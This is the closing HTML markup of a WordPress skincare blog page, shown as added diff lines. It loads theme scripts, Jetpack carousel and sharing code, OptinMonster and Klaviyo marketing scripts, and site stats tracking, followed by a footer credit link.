+<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/selectivizr/1.0.2/selectivizr-min.js' id='selectivizr-js'></script>
+<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js' id='respond-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/themes/lena/js/doubletaptogo.js' id='doubletaptogo-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/themes/lena/js/fitvids.js' id='fitvids-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/themes/lena/js/flexslider.js' id='flexslider-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/themes/lena/js/scripts.js' id='scripts-js'></script>
+<script>(function(d){var s=d.createElement("script");s.type="text/javascript";s.src="https://a.omappapi.com/app/js/api.min.js";s.async=true;s.id="omapi-script";d.getElementsByTagName("head")[0].appendChild(s);})(document);</script><script type='text/javascript' src='https://null.null/wp-includes/js/wp-embed.min.js' id='wp-embed-js'></script>
+<script id='jetpack-carousel-js-extra'>var jetpackCarouselStrings={"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/null.null\/wp-admin\/admin-ajax.php","nonce":"8374056148","display_exif":"1","display_comments":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/null.null\/primallypure-access\/?redirect_to=https%3A%2F%2Fnull.null%2Fi-broke-up-with-my-toxic-deodorant-heres-how-i-did-it%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"local_comments_commenting_as":"<fieldset><label for=\"email\">Email (Required)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Name (Required)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Website<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>"};</script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js' id='jetpack-carousel-js'></script>
+<script async="async" type='text/javascript' src='https://null.null/wp-content/plugins/akismet/_inc/form.js' id='akismet-form-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/optinmonster/assets/js/helper.js' id='optinmonster-wp-helper-js'></script>
+<script id='sharing-js-js-extra'>var sharing_js_options={"lang":"en","counts":"1","is_stats_active":"1"};</script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js' id='sharing-js-js'></script>
+<script id='sharing-js-js-after'>var windowOpen;
+jQuery(document.body).on('click', 'a.share-twitter', function(){
+if('undefined'!==typeof windowOpen){
+windowOpen.close();
+}
+windowOpen=window.open(jQuery(this).attr('href'), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350');
+return false;
+});
+var windowOpen;
+jQuery(document.body).on('click', 'a.share-facebook', function(){
+if('undefined'!==typeof windowOpen){
+windowOpen.close();
+}
+windowOpen=window.open(jQuery(this).attr('href'), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400');
+return false;
+});</script>
+<script type='text/javascript' src='https://stats.wp.com/e-202035.js' async='async' defer='defer'></script>
+<script>_stq=window._stq||[];
+_stq.push([ 'view', {v:'ext',j:'1:8.8.2',blog:'107287119',post:'6632',tz:'-7',srv:'null.null'} ]);
+_stq.push([ 'clickTrackerInit', '107287119', '6632' ]);</script>
+<a href="https://chloedigital.com/powered-by-chloedigital/?cdbabe=null.null&amp;utm_source=poweredby&amp;utm_medium=footer&amp;utm_campaign=null.null" class="cd-poweredby-link sr-only" data-wpel-link="external" target="_blank" rel="nofollow external">
+powered by chloédigital  </a>
+<script>(function($){
+var cd_link=$('<a />', {
+'target': '_blank',
+'href': 'https://chloedigital.com/powered-by-chloedigital/?cdbabe=The+Primally+Pure+Skincare+Blog&utm_source=poweredby&utm_medium=footer&utm_campaign=null.null',
+'class': 'cd-poweredby-link'
+});
+cd_link.append('powered by chloédigital');
+cd_link.appendTo('.footer-inner-column-left');
+}(jQuery));</script>
+<style>.sr-only{position:absolute;width:1px;height:1px;padding:0;left:0;bottom:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;}
+.cd-poweredby-link{width:100%;text-align:center;display:inline-block;font-size:13px;}</style>
+<script>var omapi_localized={ ajax: 'https://null.null/wp-admin/admin-ajax.php?optin-monster-ajax-route=1', nonce: '12f859bd15', slugs: {"j5xdcnyzcnmi7vaw4q28":{"slug":"j5xdcnyzcnmi7vaw4q28","mailpoet":false},"lprqwar7i9fem0zgkrdc":{"slug":"lprqwar7i9fem0zgkrdc","mailpoet":false},"nzyly74hgc1lspzhwp5u":{"slug":"nzyly74hgc1lspzhwp5u","mailpoet":false}}};</script>
+<script>var omapi_data={"wc_cart":[],"object_id":6632,"object_key":"post","object_type":"post","term_ids":[7]};</script>
+<script>jQuery(document).ready(function($){
+$('.search-bar').hide();
+$('.search-input').focus();
+$('.search-image').click(function(){
+$('.search-bar').slideToggle();
+$('.search-input').focus();
+});
+$(document).keyup(function(e){
+if(e.keyCode==27){
+$('.search-bar').slideUp();
+}});
+});</script>
+<script type="application/javascript" async src="https://static.klaviyo.com/onsite/js/klaviyo.js?company_id=HmR2mG"></script>
+</body>
+</html><!-- WP Fastest Cache file was created in 1.7218730449677 seconds, on 27-08-20 5:54:30 --><!-- via php -->
